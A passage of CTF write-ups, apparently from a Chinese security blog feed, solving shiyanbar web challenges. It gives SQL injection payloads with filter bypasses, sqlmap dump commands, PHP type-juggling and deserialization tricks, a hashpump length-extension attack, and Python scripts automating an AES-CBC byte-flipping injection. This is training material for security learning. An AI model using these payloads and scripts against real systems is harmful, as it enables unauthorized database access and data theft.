print_r($flag); }</code></pre><p>这段php将post的password值进行了反序列化，得到了一个数组，将数组的user和pass的值和???进行了比较。比较用到了php的弱类型，bool类型的true跟任意字符串可以弱类型相等<br>因此我们可以构造bool类型的序列化数据 ，无论比较的值是什么，结果都为true。（a代表array，s代表string，b代表bool，而数字代表个数/长度）<br>payload:post：a:2:{s:4:”user”;b:1;s:4:”pass”;b:1;}</p><p>flag:ctf{dwduwkhduw5465}</p><h3 id="Forms-1"><a href="#Forms-1" class="headerlink" title="Forms"></a>Forms</h3><p>查看网页源代码。</p><pre><code>&lt;input type=&quot;hidden&quot; name=&quot;showsource&quot; value=0&gt;</code></pre><p>将type中的hidden去掉，并赋值value=1，提交，就能看到源代码了。</p><pre><code>$a = $_POST[&quot;PIN&quot;];if ($a == -19827747736161128312837161661727773716166727272616149001823847) {    echo &quot;Congratulations! The flag is $flag&quot;;} else {    echo &quot;User with provided PIN not found.&quot;; }</code></pre><p>让a等于对应的数字，就能得到flag。</p><p>flag：ctf{forms_are_easy}</p><h3 id="拐弯抹角"><a href="#拐弯抹角" class="headerlink" title="拐弯抹角"></a>拐弯抹角</h3><p>题目的意思就是通过改变地址栏访问index.php，但是限制了条件不能使用 ./  ../ \ 而且只能使用小写字母，不可以在php后加点，这里我们可以利用伪静态技术，使用<a href="http://ctf5.shiyanbar.com/indirection/index.php/index.php" target="_blank" rel="external">http://ctf5.shiyanbar.com/indirection/index.php/index.php</a><br>index.php后的index.php会被当做参数处理，所以服务器只会解析第一个index.php，满足条件成功绕过。</p><p>URL重写，其实就是把带一大堆参数的url，变成一个看上去很规矩的url,主要目的是为了搜索引擎。</p><h3 id="让我进去"><a href="#让我进去" class="headerlink" title="让我进去"></a>让我进去</h3><p>先用burpsuite抓包，发现setcookie中有source=0，在cookie中赋值，将其改为1，得到源代码。<br><img src="http://oy0tigw51.bkt.clouddn.com/201803201255_194.png" alt=""></p><pre><code>$flag = &quot;XXXXXXXXXXXXXXXXXXXXXXX&quot;;$secret = &quot;XXXXXXXXXXXXXXX&quot;; // This secret is 15 characters long for security!$username = $_POST[&quot;username&quot;];$password = $_POST[&quot;password&quot;];if (!empty($_COOKIE[&quot;getmein&quot;])) {    if (urldecode($username) === &quot;admin&quot; &amp;&amp; urldecode($password) != &quot;admin&quot;) {        if ($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))) {            echo &quot;Congratulations! You are a registered user.\n&quot;;            die (&quot;The flag is &quot;. $flag);        }        else {            die (&quot;Your cookies don&#39;t match up! STOP HACKING THIS SITE.&quot;);        }    }    else {        die (&quot;You are not an admin! LEAVE.&quot;);    }}setcookie(&quot;sample-hash&quot;, md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;)), time() + (60 * 60 * 24 * 7));if (empty($_COOKIE[&quot;source&quot;])) {    setcookie(&quot;source&quot;, 0, time() + (60 * 60 * 24 * 7));}else {    if ($_COOKIE[&quot;source&quot;] != 0) {        echo &quot;&quot;; // This source code is outputted here    }}</code></pre><p>samlpe-hash是15位的secret+adminadmin的md5值，要获得flag，要让cookie中的getmein值等于secret+username+password的md5值，password又不能等于admin，所以要利用哈希扩展攻击，这里直接用的hashpump工具。</p><pre><code>hashpump -s 571580b26c65f306376d4f64e53cb5c7 -d admin -k 20 -a admin</code></pre><p>输出结果</p><pre><code>e18dfd8404515016d3aeeea2aa196909admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8\x00\x00\x00\x00\x00\x00\x00admin</code></pre><p>将\x换成%并填入对应位置。<br>hash2</p><p>flag：CTF{cOOkieS_4nd_hAshIng_G0_w3LL_t0g3ther}</p><p>打开网页，查看源代码，获得提示<!-- please post what you find with parameter:key -->，让我们post参数key。</p><p>抓包发现header头中有经过base64编码的flag参数，<br><img src="http://oy0tigw51.bkt.clouddn.com/201803200157_179.png" alt=""><br>将参数解码P0ST_THIS_T0_CH4NGE_FL4G:9x3PyMMd9，将参数9x3PyMMd9post却没有结果，题目中说尽快的提交，猜测与时间有关，用python脚本解</p><pre><code>import requests,refrom base64 import b64decodes = requests.Session()url = &#39;http://ctf5.shiyanbar.com/web/10/10.php&#39;r = s.get(url)head = r.headersflag = b64decode(head[&#39;flag&#39;]).split(&#39;:&#39;)[1]r1 = s.post(url, data={&#39;key&#39;:flag})print r1.text</code></pre><h3 id="简单的sql注入"><a href="#简单的sql注入" class="headerlink" title="简单的sql注入"></a>简单的sql注入</h3><p>1.判断<br><a href="http://ctf5.shiyanbar.com/423/web/" target="_blank" rel="external">http://ctf5.shiyanbar.com/423/web/</a><br>?id=1’<br><img src="http://oy0tigw51.bkt.clouddn.com/201803201346_982.png" alt=""><br>2.判断过滤<br><a href="http://ctf5.shiyanbar.com/423/web/" target="_blank" rel="external">http://ctf5.shiyanbar.com/423/web/</a><br>?id=1 and 1=1<br><img src="http://oy0tigw51.bkt.clouddn.com/201803201347_373.png" alt=""></p><blockquote><p>过滤空格方法</p><ol><li>注释/<strong>/绕过空格     select user() from d     变成`select/</strong>/user()/<strong>/from/</strong>/`</li><li>括号绕过空格     select user() from dual where 1=1 and 2=2     变成     select(user())from dual where(1=1)and(2=2)</li><li>使用符号替代空格 %20 %09 %0d %0b %0c %0d %a0 %0a</li></ol></blockquote><pre><code>对页面输入下面的测试项测试过滤规则测试项    输入    是否过滤逗号    ,&#39;    否注释符#    #&#39;    是注释符 --    --&#39;    是注释符/**/    /**/&#39;    否updatexml函数    updatexml &#39;    否select    select&#39;    否select    select &#39;    是select    select/**/&#39;    否select    /*!select*/    否or    or&#39;    否and    and&#39;    否concat    concat &#39;    否group_concat    group_concat&#39;    是group_concat    /*groupt_concat*/&#39;    是group_concat    groupgroup_concat_concat&#39;    否</code></pre><p>3.判断有那些数据库：</p><pre><code>http://ctf5.shiyanbar.com/423/web/?id=1&#39;/**/union/**/select/**/schema_name/**/from/**/information_schema.schemata/**/where/**/&#39;1&#39;=&#39;1</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201803201407_844.png" alt=""></p><ol><li>查看有哪些数据表：<br><a href="http://ctf5.shiyanbar.com/423/web/" target="_blank" rel="external">http://ctf5.shiyanbar.com/423/web/</a><br>?id=1’/<strong>/union/</strong>/select/<strong>/table_name/</strong>/from/<strong>/information_schema.tables/</strong>/where/<strong>/‘1’=’1<br><img src="http://oy0tigw51.bkt.clouddn.com/201803201415_889.png" alt=""><br> 发现了flag的表，我们猜测应该是在web1数据库中并且字段就是flag（其实就在本页面的数据库中）<br>故：<br><a href="http://ctf5.shiyanbar.com/423/web/" target="_blank" rel="external">http://ctf5.shiyanbar.com/423/web/</a><br>?id=1’/</strong>/union/<strong>/select/</strong>/flag/<strong>/from/</strong>/web1.flag/<strong>/where/</strong>/‘1’=’1<br><img src="http://oy0tigw51.bkt.clouddn.com/201803201419_771.png" alt=""><br>方法二：<br>双空格双查询<br><a href="http://ctf5.shiyanbar.com/423/web/" target="_blank" rel="external">http://ctf5.shiyanbar.com/423/web/</a><br>?id=1’  unionunion  selectselect  flag  fromfrom  flag  wherewhere ‘1’=’1</li></ol><p>###简单的sql注入之2<br>用?id=1 and 1=1测试，返回SQLi detected!，这是过滤了and？又尝试了很多关键字，都返回SQLi detected!，那可能是过滤了空格。<br>绕过空格<br><img src="http://oy0tigw51.bkt.clouddn.com/201803201422_573.png" alt=""><br>payload</p><pre><code>http://ctf5.shiyanbar.com/web/index_2.php/?id=1&#39;/**/union/**/select/**/flag/**/from/**/flag/**/where/**/&#39;1&#39;=&#39;1</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201803201437_337.png" alt=""></p><h3 id="简单的sql注入之3"><a href="#简单的sql注入之3" class="headerlink" title="简单的sql注入之3"></a>简单的sql注入之3</h3><p>注库名</p><pre><code>sqlmap -u &quot;http://ctf5.shiyanbar.com/web/index_3.php?id=1&quot; --dbs</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201803201444_689.png" alt=""></p><p>当前数据库<br>Sqlmap -u “<a href="http://ctf5.shiyanbar.com/web/index_3.php/?id=1" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/index_3.php/?id=1</a>“ –current-db</p><p>注表名<br>sqlmap -u “<a href="http://ctf5.shiyanbar.com/web/index_3.php?id=1" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/index_3.php?id=1</a>“ -D “web1” –tables<br><img src="http://oy0tigw51.bkt.clouddn.com/201803201453_629.png" alt=""></p><p>注字段<br>sqlmap -u “<a href="http://ctf5.shiyanbar.com/web/index_3.php?id=1" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/index_3.php?id=1</a>“ -D “web1” -T “flag” –columns<br><img src="http://oy0tigw51.bkt.clouddn.com/201803201457_156.png" alt=""><br>注内容<br>sqlmap -u “<a href="http://ctf5.shiyanbar.com/web/index_3.php?id=123" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/index_3.php?id=123</a>“ -D “web1” -T “flag” -C “flag” –dump<br><img src="http://oy0tigw51.bkt.clouddn.com/201803201517_635.png" alt=""></p><p>flag{Y0u_@r3_5O_dAmn_90Od}</p><h3 id="因缺思汀的绕过"><a href="#因缺思汀的绕过" class="headerlink" title="因缺思汀的绕过"></a>因缺思汀的绕过</h3><p><a href="http://ctf5.shiyanbar.com/web/pcat/source.txt" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/pcat/source.txt</a></p><pre><code>&lt;?phperror_reporting(0);if (!isset($_POST[&#39;uname&#39;]) || !isset($_POST[&#39;pwd&#39;])) {  echo &#39;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&#39;.&quot;&lt;br/&gt;&quot;;  echo &#39;&lt;input name=&quot;uname&quot; type=&quot;text&quot;/&gt;&#39;.&quot;&lt;br/&gt;&quot;;  echo &#39;&lt;input name=&quot;pwd&quot; type=&quot;text&quot;/&gt;&#39;.&quot;&lt;br/&gt;&quot;;  echo &#39;&lt;input type=&quot;submit&quot; /&gt;&#39;.&quot;&lt;br/&gt;&quot;;  echo &#39;&lt;/form&gt;&#39;.&quot;&lt;br/&gt;&quot;;  echo &#39;&lt;!--source: source.txt--&gt;&#39;.&quot;&lt;br/&gt;&quot;;    die;}function AttackFilter($StrKey,$StrValue,$ArrReq){      if (is_array($StrValue)){        $StrValue=implode($StrValue);    }    if (preg_match(&quot;/&quot;.$ArrReq.&quot;/is&quot;,$StrValue)==1){           print &quot;水可载舟，亦可赛艇！&quot;;        exit();    }}$filter = &quot;and|select|from|where|union|join|sleep|benchmark|,|\(|\)&quot;;foreach($_POST as $key=&gt;$value){     AttackFilter($key,$value,$filter);}$con = mysql_connect(&quot;XXXXXX&quot;,&quot;XXXXXX&quot;,&quot;XXXXXX&quot;);if (!$con){  die(&#39;Could not connect: &#39; . mysql_error());}$db=&quot;XXXXXX&quot;;mysql_select_db($db, $con);$sql=&quot;SELECT * FROM interest WHERE uname = &#39;{$_POST[&#39;uname&#39;]}&#39;&quot;;$query = mysql_query($sql); if (mysql_num_rows($query) == 1) {     $key = mysql_fetch_array($query);    if($key[&#39;pwd&#39;] == $_POST[&#39;pwd&#39;]) {        print &quot;CTF{XXXXXX}&quot;;    }else{        print &quot;亦可赛艇！&quot;;    }}else{  print &quot;一颗赛艇！&quot;;}mysql_close($con);?&gt;</code></pre><p>注意过滤了这些关键字</p><pre><code>$filter = “and|select|from|where|union|join|sleep|benchmark|,|(|)“;</code></pre><p>要输出flag就要满足<code>mysql_num_rows($query) == 1、$key[&#39;pwd&#39;] == $_POST[&#39;pwd&#39;]</code>这两个条件。</p><p>mysql_num_rows()函数返回结果集中行的数目。我们构造uname让sql语句查询出来的结果是一行就能绕过。Uname = ‘or 1 limit 1#，这样sql语句就是SELECT * FROM interest WHERE uname = ‘’or 1 limit 1#，这样就查询1行，也就能绕过第一个条件。<br>从源码分析可得，过滤了逗号，我们不能简单的使用limit 1,1这样的语法，而是可以使用limit 1 offset 1。</p><p>第二个条件是让查询的pwd的值等于输入的值，此处用的是 ==，根据弱类型，NULL和空字符串是相等的，然后就是绕过pwd了，<br>这里的思路是，利用group by pwd with rollup在查询中的一个特点，他可以返回pwd所在的那一条记录，通过limit控制返回哪一条，因此他不可以返回多条，一旦返回2条及以上，pwd就会为空，但同一条记录中的其他字段则是正常的</p><p>那么利用这一点令查询结果为空，我们输入的pwd也为空值，则构成了if(null==null)为true<br>即：输入的用户名为：’ or 1=1 group by pwd with rollup limit 1 offset 2 #<br>这里解释一下此时执行的SQL:<br>SELECT * FROM interest where uname=’ ‘ or 1=1<br>group by pwd with rollup （在数据库中添加一行使得pwd=NULL）<br>limit 1 （只查询一行）<br>offset 2 （从第二行开始查询）#注释<br>此时密码只要为空即可查询成功</p><p>payload:uname=’or 1 group by pwd with rollup limit 1 OFFSET 2#</p><p>flag：CTF{with_rollup_interesting}</p><h3 id="who-are-you"><a href="#who-are-you" class="headerlink" title="who are you?"></a>who are you?</h3><p>自己没做出来<br>别人的wp三种方法：<br><a href="https://www.jianshu.com/p/5d34b3722128" target="_blank" rel="external">https://www.jianshu.com/p/5d34b3722128</a></p><h3 id="登录一下好吗？？"><a href="#登录一下好吗？？" class="headerlink" title="登录一下好吗？？"></a>登录一下好吗？？</h3><p>题目地址: <a href="http://ctf5.shiyanbar.com/web/wonderkun/web/index.html" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/wonderkun/web/index.html</a></p><p>在用户名表单里提交一系列字段可以发现题目过滤了几乎所有查询语句，注释，但是没有过滤’，这里的绕过比较巧妙，由于=是从左到到运算的，所以可以人为构造0=0的结果，payload为username=1’=’&amp;password=1’=’，拼接后的语句为:</p><pre><code>select * from user where username=&#39;1&#39;=&#39;&#39; and password=&#39;1&#39;=&#39;&#39;</code></pre><p>username=’1’=’’这句，先有username=’1’返回0，然后再和’’比较，mysql中的弱类型比较0和空字符串是相等的，所以能返回1，后面半句同理，所以整句能够返回1，flag为ctf{51d1bf8fb65a8c2406513ee8f52283e7}。<br><img src="http://oy0tigw51.bkt.clouddn.com/201804011614_554.png" alt=""></p><h3 id="你真的会PHP吗？"><a href="#你真的会PHP吗？" class="headerlink" title="*你真的会PHP吗？"></a>*你真的会PHP吗？</h3><p>首先fiddler抓包，在response header中发现hint:6c525af4059b4fe7d8c33a.txt,打开后找到index.php源码<br><img src="http://oy0tigw51.bkt.clouddn.com/201803201958_595.png" alt=""></p><pre><code>&lt;?php$info = &quot;&quot;; $req = [];$flag=&quot;xxxxxxxxxx&quot;;ini_set(&quot;display_error&quot;, false); error_reporting(0); if(!isset($_POST[&#39;number&#39;])){   header(&quot;hint:6c525af4059b4fe7d8c33a.txt&quot;);   die(&quot;have a fun!!&quot;); }foreach([$_POST] as $global_var) {     foreach($global_var as $key =&gt; $value) {         $value = trim($value);         is_string($value) &amp;&amp; $req[$key] = addslashes($value);     } } function is_palindrome_number($number) {     $number = strval($number);     $i = 0;     $j = strlen($number) - 1;     while($i &lt; $j) {         if($number[$i] !== $number[$j]) {             return false;         }         $i++;         $j--;     }     return true; } if(is_numeric($_REQUEST[&#39;number&#39;])){   $info=&quot;sorry, you cann&#39;t input a number!&quot;;}elseif($req[&#39;number&#39;]!=strval(intval($req[&#39;number&#39;]))){     $info = &quot;number must be equal to it&#39;s integer!! &quot;;  }else{     $value1 = intval($req[&quot;number&quot;]);     $value2 = intval(strrev($req[&quot;number&quot;]));       if($value1!=$value2){          $info=&quot;no, this is not a palindrome number!&quot;;     }else{          if(is_palindrome_number($req[&quot;number&quot;])){              $info = &quot;nice! {$value1} is a palindrome number!&quot;;           }else{             $info=$flag;          }     }}echo $info;</code></pre><p>经过审计我们可以发现如果我们要拿到flag，POST的number需要满足以下条件：<br>1.不为空，且不能是一个数值型数字，包括小数。(由is_numeric函数判断)<br>2.不能是一个回文数。（is_palindrome_number判断）<br>3.该数的反转的整数值应该和它本身的整数值相等。即：</p><p>intval($req[“number”])=intval(strrev($req[“number”]))<br>1<br>回文数就是类似于121这样的数。从上面可以看出2，3条件似乎是冲突滴！</p><p>下面给出两种解法：</p><p>1.利用intval函数溢出绕过<br>Intval函数获取变量整数值。<br>函数介绍清点这里<br>Intval最大的值取决于操作系统。 32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。举例，在这样的系统上， intval(‘1000000000000’) 会返回 2147483647。64 位系统上，最大带符号的 integer 值是 9223372036854775807。</p><p>通过上面我们知道服务器的操作系统是32位的，所以我们构造2147483647就可以同时满足2，3条件。通过把空字符可以绕过is_numeric的判断（如%00,%20）,所以我们构造以下poc，number=2147483647%00 和number=2147483647%20都可。</p><p>对于第一个条件，我们需要构造是让我们的poc被函数判断为非数值，但又不影响它值的构造，理所当然想到空格字符和空字符。</p><p>而经过测试我发现is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后。所以，查看函数发现该函数对对于第一个空格字符会跳过空格字符判断，接着后面的判断！！<br><img src="http://oy0tigw51.bkt.clouddn.com/201803202002_274.png" alt=""></p><h3 id="后台登录"><a href="#后台登录" class="headerlink" title="后台登录"></a>后台登录</h3><p>首先代码审查</p><p>在查看页面源码中发现 代码泄露</p><pre><code>&lt;!-- $password=$_POST[&#39;password&#39;];    $sql = &quot;SELECT * FROM admin WHERE username = &#39;admin&#39; and password = &#39;&quot;.md5($password,true).&quot;&#39;&quot;;    $result=mysqli_query($link,$sql);        if(mysqli_num_rows($result)&gt;0){            echo &#39;flag is :&#39;.$flag;        }        else{            echo &#39;密码错误!&#39;;        } --&gt;</code></pre><p>后台对传入的 password进行MD5加密后进行数据库 </p><p>想着怎么去构造一个MD5加密后的结果 在百度上搜了下<br>找到一个字符串  ffifdyop md5后，276f722736c95d99e921722cf9ed621c<br>再转成字符串：<code>&#39;or&#39;6&lt;trash&gt;</code><br>那整个sql变成</p><pre><code>SELECT * FROM admin WHEREusername = &#39;admin&#39; and password = &#39;&#39;or&#39;6&lt;trash&gt;&#39;</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201804011637_720.png" alt=""></p><h3 id="简单的登录题"><a href="#简单的登录题" class="headerlink" title="简单的登录题"></a>简单的登录题</h3><p>这题名字叫简单的登录题，实际上一点都不算简单，要认真写一个writeup确实很费劲，但pcat还是写了一篇过得去的。</p><p>1.做题的初步收集、整理<br>index.php是一个普通的登录框，输入id来登录，我们用burpsuite抓下包，并使用Repeater功能。<br>1) 当post id时候，返回包Set-cookie里包含iv和cipher，这2个英文单词玩密码学就很容易理解，iv就是Initialization Vector(初始化向量)，cipher就是密文</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804011324_762.png" alt=""><br>注意这里有个提示：test.php<br>登录得到<br><img src="http://oy0tigw51.bkt.clouddn.com/201804011334_838.png" alt=""><br>查看源码得到<br><img src="http://oy0tigw51.bkt.clouddn.com/201804011335_302.png" alt=""><br>源码过滤|-|#|=|~|union|like|procedure这些语句</p><p>2) 使用Repeater功能不断的发送相同的包，返回的iv和cipher都不一样，基本断定每次的iv值是随机生成，另外iv和cipher的格式都是先base64编码后再进行urlencode编码。这里逻辑几句，不少人总看到base64解码后的字符是乱码后，就问该怎么解密之类的话，其实不要搞混了，base64不是一种加密方式，只是一种编码方式，base64编码后可以让不可视字符可视化（这才是最大的作用），而不起任何加密作用。<br>3) 把iv值经过urldecode再base64解码后用len()得到长度为16，基本猜测算法是aes，而且大胆猜测是aes的cbc模式<br>4) 从id=1入手，发现有#和-都会被waf检测到<br>5) 当cookies里有iv值和cipher值，然后不提交任何参数（包括id），就会显示Hello，猜测是根据传入的iv和cipher来解码后，再参与内部的sql查询出用户名<br>6) 由于aes的key值不知道，我就觉得这题比较难做了，然后先按照web题的基本思路———扫描，打开御剑扫一下，幸运的发现test.php泄露了源码。整理下源码中的逻辑：<br> <em>1 若是post id，就先进行waf检测，检测过了才随机生成iv值，并且对array(‘id’=&gt;$id)进行php的序列化操作，再进行aes加密，再分别对iv和cipher进行base64编码并设置到cookies </em>2 如果cookies里有iv和cipher，就对其base64解码，然后对其aes解密，再进行php反序列化，如果不能反序列化则返回解密后的明文的base64编码，如果可以则进行sql语句拼接，查询若是行数&gt;0就显示其username列的值，否则都是Hello!<br> <em>3 难点1，过滤了#-=,还有union和procedure </em>4 难点2，注入点在limit后面，而且后面还是”,0”，0本来就是让limit取出0行，而前面的逗号更是难弄掉<br> *5 aes的加密模式aes-128-cbc<br>7) mysql语法，limit后面只能procedure还有for update，还有尝试了堆叠注入，也是不行。<br>8) 本题算比较好点，mysql会显示错误信息，这就可以弄报错注入（当前是得有前提的）</p><p>2.构建能绕过过滤的payload<br>尝试了很多，发现post id=1;%00（这里关键是;%00）可以绕过去，然后登录后会显示Hello!rootzz，说明user表里的值是rootzz，而并不是我们所期待的flag值（如果那么简单就好了- -）<br>关键的关键字都被过滤，这可怎么办？<br>这时候要冷静分析下。<br>1) 直接post id时候是有过滤<br>2) 在cookies解密出来是没有过滤，就直接拼接sql语句<br>于是我们可以大胆猜测，修改cookies的值来达到解密后的明文可以构造sql注入。</p><p>这并不是无的放矢，在密码学里是可以做到的</p><p>3.aes的cbc byte flipping attack（cbc字节翻转攻击）<br>先放出参考文章，自己可以多去阅读<br>推荐英文文章：<br><a href="http://resources.infosecinstitute.com/cbc-byte-flipping-attack-101-approach/" target="_blank" rel="external">http://resources.infosecinstitute.com/cbc-byte-flipping-attack-101-approach/</a><br>以下是中文译文（其中图片挂了，结合英文版就没问题）：</p><pre><code>http://wps2015.org/drops/drops/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB-101Approach.html=======</code></pre><p>cbc字节翻转攻击，我就不叙述原理，我直接演示一个简单的操作：<br>把id=12的密文修改后解析为id=1#</p><p>这里因为序列化是php的，我先写了一个php文件，便于显示</p><pre><code>&lt;?php$id=@$_POST[&#39;id&#39;];$info = array(&#39;id&#39;=&gt;$id);$plain = serialize($info);$row=ceil(strlen($plain)/16);for($i=0;$i&lt;$row;$i++){    echo substr($plain,$i*16,16).&#39;&lt;br/&gt;&#39;;}</code></pre><p>当post id=12时候，显示<br>a:1:{s:2:”id”;s:<br>2:”12”;}<br>每一行16个字节，这里12的2对应上一行{的偏离量是4<br>有这个准备后，<br>在原题里post id=12，得到下面（这只是示例）<br>iv=ZoP2z9EI7VWaWz%2F1GfYB6Q%3D%3D<br>cipher=U9qq54FOYcS2MFFB7UJFjVcSWpi0zsc%2BnVAnMkjkcRY%3D</p><p>运行以下脚本</p><pre><code># -*- coding:utf8 -*-__author__=&#39;pcat@chamd5.org&#39;from base64 import *import urllibcipher=&#39;U9qq54FOYcS2MFFB7UJFjVcSWpi0zsc%2BnVAnMkjkcRY%3D&#39;cipher_raw=b64decode(urllib.unquote(cipher))lst=list(cipher_raw)idx=4c1=&#39;2&#39;c2=&#39;#&#39;lst[idx]=chr(ord(lst[idx])^ord(c1)^ord(c2))cipher_new=&#39;&#39;.join(lst)cipher_new=urllib.quote(b64encode(cipher_new))print cipher_new</code></pre><p>得到cipher_new<br>U9qq55BOYcS2MFFB7UJFjVcSWpi0zsc%2BnVAnMkjkcRY%3D<br>再用之前的iv一起去访问，得到<br>base64_decode(‘g8COFrN/0Z3FDCOZ6MfV5zI6IjEjIjt9’) can’t unserialize<br>这是因为iv值没修改，导致无法反序列化</p><p>运行以下脚本</p><pre><code># -*- coding:utf8 -*-__author__=&#39;pcat@chamd5.org&#39;from base64 import *import urllibiv=&#39;ZoP2z9EI7VWaWz%2F1GfYB6Q%3D%3D&#39;iv_raw=b64decode(urllib.unquote(iv))first=&#39;a:1:{s:2:&quot;id&quot;;s:&#39;plain=b64decode(&#39;g8COFrN/0Z3FDCOZ6MfV5zI6IjEjIjt9&#39;)iv_new=&#39;&#39;for i in range(16):    iv_new+=chr(ord(plain[i])^ord(first[i])^ord(iv_raw[i]))iv_new=urllib.quote(b64encode(iv_new))print iv_new</code></pre><p>得到iv_new<br>hHlJ4xkEBvpldXUI0wqnNA%3D%3D<br>再跟之前的cipher_new，一起去访问，得到<br>Hello!rootzz<br>也就是id=12顺利变成了id=1#注入成功。</p><p>离成功就差一步了，<br>1) 把上面的过程编写成脚本<br>2) 尽可能只翻转一个字节，例如把2nion翻转为union，末尾再用;%00来注释掉后面<br>3) 由于逗号被过滤，用join来代替；等号被过滤，用regexp来代替</p><p>以下是pcat的脚本：</p><pre><code># -*- coding:utf8 -*-# 请保留我的个人信息，谢谢~！__author__=&#39;pcat@chamd5.org&#39;from base64 import *import urllibimport requestsimport redef mydecode(value):    return b64decode(urllib.unquote(value))def myencode(value):    return urllib.quote(b64encode(value))def mycbc(value,idx,c1,c2):    lst=list(value)    lst[idx]=chr(ord(lst[idx])^ord(c1)^ord(c2))    return &#39;&#39;.join(lst)def pcat(payload,idx,c1,c2):    url=r&#39;http://ctf5.shiyanbar.com/web/jiandan/index.php&#39;    myd={&#39;id&#39;:payload}    res=requests.post(url,data=myd)    cookies=res.headers[&#39;Set-Cookie&#39;]    iv=re.findall(r&#39;iv=(.*?),&#39;,cookies)[0]    cipher=re.findall(r&#39;cipher=(.*)&#39;,cookies)[0]    iv_raw=mydecode(iv)    cipher_raw=mydecode(cipher)    cipher_new=myencode(mycbc(cipher_raw,idx,c1,c2))    cookies_new={&#39;iv&#39;:iv,&#39;cipher&#39;:cipher_new}    cont=requests.get(url,cookies=cookies_new).content    plain=b64decode(re.findall(r&quot;base64_decode\(&#39;(.*?)&#39;\)&quot;,cont)[0])    first=&#39;a:1:{s:2:&quot;id&quot;;s:&#39;    iv_new=&#39;&#39;    for i in range(16):        iv_new+=chr(ord(first[i])^ord(plain[i])^ord(iv_raw[i]))    iv_new=myencode(iv_new)    cookies_new={&#39;iv&#39;:iv_new,&#39;cipher&#39;:cipher_new}    cont=requests.get(url,cookies=cookies_new).content    print &#39;Payload:%s\n&gt;&gt; &#39; %(payload)    print cont    passdef foo():    pcat(&#39;12&#39;,4,&#39;2&#39;,&#39;#&#39;)    pcat(&#39;0 2nion select * from((select 1)a join (select 2)b join (select 3)c);&#39;+chr(0),6,&#39;2&#39;,&#39;u&#39;)    pcat(&#39;0 2nion select * from((select 1)a join (select group_concat(table_name) from information_schema.tables where table_schema regexp database())b join (select 3)c);&#39;+chr(0),7,&#39;2&#39;,&#39;u&#39;)    pcat(&quot;0 2nion select * from((select 1)a join (select group_concat(column_name) from information_schema.columns where table_name regexp &#39;you_want&#39;)b join (select 3)c);&quot;+chr(0),7,&#39;2&#39;,&#39;u&#39;)    pcat(&quot;0 2nion select * from((select 1)a join (select value from you_want limit 1)b join (select 3)c);&quot;+chr(0),6,&#39;2&#39;,&#39;u&#39;)    passif __name__ == &#39;__main__&#39;:    foo()    print &#39;ok&#39;</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;实验吧web—writeup&quot;&gt;&lt;a href=&quot;#实验吧web—writeup&quot; class=&quot;headerlink&quot; title=&quot;实验吧web—writeup&quot;&gt;&lt;/a&gt;实验吧web—writeup&lt;/h1&gt;&lt;p&gt;[toc]&lt;/p&gt;
&lt;h3 id=&quot;Form
      
    
    </summary>
    
      <category term="CTF" scheme="http://0xmj.club/categories/CTF/"/>
    
    
      <category term="WP" scheme="http://0xmj.club/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>第二届强网杯-部分wp</title>
    <link href="http://0xmj.club/2018/04/02/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF-%E9%83%A8%E5%88%86wp/"/>
    <id>http://0xmj.club/2018/04/02/第二届强网杯-部分wp/</id>
    <published>2018-04-02T08:08:51.000Z</published>
    <updated>2018-04-02T08:09:14.519Z</updated>
    
    <content type="html"><![CDATA[<p>#第二届强网杯-部分wp</p><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>flag{welcome_to_qwb}</p><h2 id="web签到"><a href="#web签到" class="headerlink" title="web签到"></a>web签到</h2><blockquote><p>=== 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较<br>== 在进行比较的时候，会先将字符串类型转化成相同，再比较</p></blockquote><p>第一关<br><img src="http://oy0tigw51.bkt.clouddn.com/201803252209_432.png" alt=""><br>这个就是标准的弱类型了<br>取md5之后为0e开头的字符串，如<br>param1=240610708<br>param2=s878926199a<br>第二关<br><img src="http://oy0tigw51.bkt.clouddn.com/201803252216_349.jpg" 